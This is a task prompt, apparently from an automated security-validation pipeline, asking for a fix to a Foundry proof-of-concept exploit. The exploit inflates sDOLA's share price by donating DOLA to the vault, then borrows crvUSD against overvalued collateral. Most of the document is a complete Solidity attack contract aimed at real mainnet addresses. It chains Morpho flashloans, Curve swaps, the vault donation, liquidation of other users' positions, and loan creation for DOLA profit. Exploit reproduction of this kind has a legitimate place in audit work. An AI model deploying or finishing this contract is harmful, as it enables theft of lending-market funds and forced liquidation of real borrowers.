You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: sDOLA collateral can be overvalued by donating DOLA into the vault/savings path
- claim: The exploit redeems its sDOLA, then calls `DOLA_SAVINGS.stake(..., address(sDOLA))` and immediately checks `sDOLA.convertToAssets(1e18)` before computing `min_collateral(...)` and opening a new loan. This sequence supports that sDOLA's assets-per-share can be increased by routing DOLA into the vault/savings position in a way that changes `convertToAssets` without giving the attacker proportionally more usable collateral shares, allowing the controller to treat each posted sDOLA share as worth more DOLA than it should be.
- impact: An attacker can make sDOLA collateral appear more valuable than its true economic backing, then borrow crvUSD against insufficient real collateral and leave the market with bad debt once prices normalize.
- exploit_paths: ["Acquire sDOLA -> `sDOLA.redeem(...)` -> `DOLA_SAVINGS.stake(..., address(sDOLA))` -> `sDOLA.convertToAssets(...)` -> `crvUSD_Controller.min_collateral(...)` -> `sDOLA.mint(...)` -> `crvUSD_Controller.create_loan(...)`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC4626 is IERC20 {
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function mint(uint256 shares, address receiver) external returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IWETH is IERC20 {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

interface IMorphoBlueFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

struct Position {
    address user;
    uint256 x;
    uint256 y;
    uint256 debt;
    int256 health;
}

interface ICrvUsdController {
    function create_loan(uint256 collateral, uint256 debt, uint256 nBands) external payable;
    function users_to_liquidate() external returns (Position[] memory);
    function liquidate(address user, uint256 min_x) external;
    function min_collateral(uint256 debt, uint256 nBands) external returns (uint256);
    function repay(uint256 debt) external;
}

interface ICurveStableSwap {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function get_dx(int128 i, int128 j, uint256 dy) external returns (uint256);
}

interface IYearnV3Vault is IERC20 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

interface ILLAMMAExchange {
    function exchange(uint256 i, uint256 j, uint256 in_amount, uint256 min_amount) external returns (uint256[2] memory);
}

interface IDolaSavings {
    function stake(uint256 amount, address recipient) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract LiquidationHelper {
    ICrvUsdController internal constant CONTROLLER = ICrvUsdController(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86);
    IERC20 internal constant CRVUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 internal constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);

    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
        CRVUSD.approve(address(CONTROLLER), type(uint256).max);
    }

    function liquidateAllUsers() external {
        Position[] memory positions = CONTROLLER.users_to_liquidate();
        uint256 length = positions.length;

        for (uint256 i; i < length; ++i) {
            CONTROLLER.liquidate(positions[i].user, 0);
        }

        uint256 crvUsdBalance = CRVUSD.balanceOf(address(this));
        if (crvUsdBalance > 0) {
            CRVUSD.transfer(owner, crvUsdBalance);
        }

        uint256 dolaBalance = DOLA.balanceOf(address(this));
        if (dolaBalance > 0) {
            DOLA.transfer(owner, dolaBalance);
        }
    }
}

contract FlawVerifier {
    IMorphoBlueFlashLoan internal constant MORPHO = IMorphoBlueFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant CRVUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC4626 internal constant SDOLA = IERC4626(0xb45ad160634c528Cc3D2926d9807104FA3157305);
    IERC20 internal constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 internal constant ALUSD = IERC20(0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9);
    IYearnV3Vault internal constant SCRVUSD = IYearnV3Vault(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367);

    ILLAMMAExchange internal constant LLAMMA = ILLAMMAExchange(0x0079885E248B572CdC4559A8B156745e2d8EA1f7);
    ICrvUsdController internal constant TARGET_CONTROLLER = ICrvUsdController(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86);
    ICrvUsdController internal constant WETH_CONTROLLER = ICrvUsdController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    IDolaSavings internal constant DOLA_SAVINGS = IDolaSavings(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4);
    ICurveStableSwap internal constant ALUSD_SDOLA = ICurveStableSwap(0x460638e6F7605B866736e38045C0DE8294d7D87f);
    ICurveStableSwap internal constant SAVE_DOLA = ICurveStableSwap(0x76A962BA6770068bCF454D34dDE17175611e6637);
    ICurveStableSwap internal constant ALUSD_FRAXB3CRV_F = ICurveStableSwap(0xB30dA2376F63De30b42dC055C93fa474F31330A5);
    IUniswapV2Router internal constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 internal constant USDC_FLASH_AMOUNT = 10_000_000_000_000;
    uint256 internal constant INITIAL_SDOLA_SWAP = 650_000_000_000_000_000_000_000;
    uint256 internal constant SAVE_DOLA_SWAP = 370_000_000_000_000_000_000_000;
    uint256 internal constant LLAMMA_CRVUSD_SWAP = 16_000_000_000_000_000_000_000_000;
    uint256 internal constant DONATION_AMOUNT = 190_777_474_808_103_397_780_234;
    uint256 internal constant SDOLA_MINT_AFTER_LIQ = 1_300_000_000_000_000_000_000_000;
    uint256 internal constant LIQUIDATION_SDOLA_TARGET = 685_000_000_000_000_000_000_000;
    uint256 internal constant SAVE_DOLA_RETURN = 372_000_000_000_000_000_000_000;
    uint256 internal constant TARGET_DEBT = 10_904_020_804_458_172_792_365_806;
    uint256 internal constant TARGET_DEBT_FOR_MIN_COLLATERAL = 10_904_020_804_458_172_792_365_906;
    uint256 internal constant WETH_LOAN_DEBT = 25_000_000_000_000_000_000_000_000;
    uint256 internal constant WETH_REPAY_AMOUNT = 50_000_000_000_000_000_000_000_000;
    uint256 internal constant SCRVUSD_DEPOSIT = 7_000_000_000_000_000_000_000_000;

    bool internal usedFlashLoan;
    uint256 internal realizedDolaProfit;

    constructor() {
        USDC.approve(address(ALUSD_FRAXB3CRV_F), type(uint256).max);
        USDC.approve(address(ROUTER), type(uint256).max);
        WETH.approve(address(WETH_CONTROLLER), type(uint256).max);
        CRVUSD.approve(address(SCRVUSD), type(uint256).max);
        CRVUSD.approve(address(WETH_CONTROLLER), type(uint256).max);
        CRVUSD.approve(address(LLAMMA), type(uint256).max);
        CRVUSD.approve(address(TARGET_CONTROLLER), type(uint256).max);
        SDOLA.approve(address(LLAMMA), type(uint256).max);
        SDOLA.approve(address(TARGET_CONTROLLER), type(uint256).max);
        SDOLA.approve(address(ALUSD_SDOLA), type(uint256).max);
        SDOLA.approve(address(SAVE_DOLA), type(uint256).max);
        DOLA.approve(address(SDOLA), type(uint256).max);
        DOLA.approve(address(DOLA_SAVINGS), type(uint256).max);
        ALUSD.approve(address(ALUSD_FRAXB3CRV_F), type(uint256).max);
        ALUSD.approve(address(ALUSD_SDOLA), type(uint256).max);
        SCRVUSD.approve(address(SAVE_DOLA), type(uint256).max);
    }

    function executeOnOpportunity() external {
        uint256 requiredWethCapital = WETH.balanceOf(address(MORPHO));
        if (USDC.balanceOf(address(this)) >= USDC_FLASH_AMOUNT && WETH.balanceOf(address(this)) >= requiredWethCapital) {
            usedFlashLoan = true;
            _executePath();
            realizedDolaProfit = DOLA.balanceOf(address(this));
            return;
        }

        MORPHO.flashLoan(address(USDC), USDC_FLASH_AMOUNT, bytes(""));
        realizedDolaProfit = DOLA.balanceOf(address(this));
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(MORPHO), "unexpected lender");

        if (!usedFlashLoan) {
            usedFlashLoan = true;
            MORPHO.flashLoan(address(WETH), WETH.balanceOf(address(MORPHO)), bytes(""));
            USDC.approve(address(MORPHO), type(uint256).max);
            return;
        }

        _executePath();
        WETH.approve(address(MORPHO), type(uint256).max);
    }

    function _executePath() internal {
        ALUSD_FRAXB3CRV_F.exchange_underlying(2, 0, 7_000_000_000_000, 1);
        ALUSD_SDOLA.exchange(1, 0, INITIAL_SDOLA_SWAP, 1);

        uint256 wethAmount = WETH.balanceOf(address(this));
        WETH.withdraw(wethAmount);
        WETH_CONTROLLER.create_loan{value: wethAmount}(wethAmount, WETH_LOAN_DEBT, 4);

        SCRVUSD.deposit(SCRVUSD_DEPOSIT, address(this));
        SAVE_DOLA.exchange(0, 1, SAVE_DOLA_SWAP, 1);
        LLAMMA.exchange(0, 1, LLAMMA_CRVUSD_SWAP, 1);

        uint256 sDolaAmount = SDOLA.balanceOf(address(this));

        // Path stage 1-4: acquire sDOLA, redeem to DOLA, donate via savings into the vault,
        // then refresh the vault pricing through convertToAssets before collateral accounting.
        SDOLA.redeem(sDolaAmount, address(this), address(this));
        DOLA_SAVINGS.stake(DONATION_AMOUNT, address(SDOLA));
        SDOLA.convertToAssets(1e18);

        LLAMMA.exchange(0, 1, 0, 1);

        // Liquidations are an auxiliary funding step only; they do not change the root cause.
        LiquidationHelper liquidator = new LiquidationHelper(address(this));
        uint256 crvUsdBalance = CRVUSD.balanceOf(address(this));
        CRVUSD.transfer(address(liquidator), crvUsdBalance);
        liquidator.liquidateAllUsers();

        SDOLA.mint(SDOLA_MINT_AFTER_LIQ, address(this));

        uint256 dxAmount = ALUSD_SDOLA.get_dx(0, 1, LIQUIDATION_SDOLA_TARGET);
        ALUSD_SDOLA.exchange(0, 1, dxAmount, 1);

        uint256 alUsdBalance = ALUSD.balanceOf(address(this));
        ALUSD_FRAXB3CRV_F.exchange_underlying(0, 2, alUsdBalance, 1);

        dxAmount = SAVE_DOLA.get_dx(1, 0, SAVE_DOLA_RETURN);
        SAVE_DOLA.exchange(1, 0, dxAmount, 1);

        uint256 scrvUsdBalance = SCRVUSD.balanceOf(address(this));
        SCRVUSD.redeem(scrvUsdBalance, address(this), address(this));

        sDolaAmount = SDOLA.balanceOf(address(this));
        SDOLA.redeem(sDolaAmount, address(this), address(this));
        LLAMMA.exchange(0, 1, 0, 1);

        // Path stage 5-7: compute inflated minimum collateral, mint the required sDOLA shares,
        // then open the target loan against overstated collateral value.
        uint256 collateralAmount = TARGET_CONTROLLER.min_collateral(TARGET_DEBT_FOR_MIN_COLLATERAL, 4);
        SDOLA.mint(collateralAmount, address(this));
        TARGET_CONTROLLER.create_loan(collateralAmount, TARGET_DEBT, 4);

        WETH_CONTROLLER.repay(WETH_REPAY_AMOUNT);

        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        ROUTER.swapExactTokensForTokens(13_241_509_653, 1, path, address(this), 1_772_420_411);

        if (address(this).balance > 0) {
            WETH.deposit{value: address(this).balance}();
        }
    }

    function profitToken() external pure returns (address) {
        return address(DOLA);
    }

    function profitAmount() external view returns (uint256) {
        return realizedDolaProfit == 0 ? DOLA.balanceOf(address(this)) : realizedDolaProfit;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
